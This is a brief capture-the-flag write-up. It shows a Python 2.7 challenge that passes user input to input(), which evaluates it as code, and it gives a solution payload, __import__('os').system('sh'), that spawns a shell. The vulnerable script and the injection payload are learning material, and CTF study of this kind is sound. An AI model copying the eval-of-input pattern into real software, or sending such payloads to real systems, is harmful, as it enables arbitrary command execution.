# how r u

## challenge

```py
#!/usr/bin/env python2.7
try:
        input("hello! how are you feeling today? > ")
except:
        print("hello! how are you feeling today? > ")
```

## solution

this uses `input` and not `raw_input`. this is super dangerous in python 2.7 bc we can just put in python code and it will execute it :skull:

we can just type in `__import__('os').system('sh')` to win lol
